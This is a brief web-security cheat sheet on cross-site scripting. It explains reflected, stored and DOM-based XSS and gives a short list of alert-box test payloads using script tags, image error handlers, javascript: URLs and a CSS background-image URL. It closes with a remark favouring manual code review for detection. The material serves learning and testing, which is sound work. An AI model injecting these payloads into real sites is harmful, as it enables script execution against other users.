**XSS**

**Reflected XSS** (script reflected back in the response):
```
<script>alert('XSS')</script>
```

**Stored XSS** (script stored on the server and executed by users):
```
<img src=x onerror=alert('XSS')>

```

**DOM-Based XSS** (script executed directly in the browser due to DOM manipulation):
```
javascript:alert('XSS')
```

```
- Payloads to Use:    
    - Basic: <script>alert('XSS')</script>        
    - Event Handlers: <img src=x onerror=alert('XSS')>        
    - JavaScript URLs: <a href="javascript:alert('XSS')">Click me</a>        
    - CSS Injection: <div style="background-image: url(javascript:alert('XSS'));">
```


*The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code. If we understand precisely how our input is being handled all the way until it reaches the web browser, we can write a custom payload that should work with high confidence.*
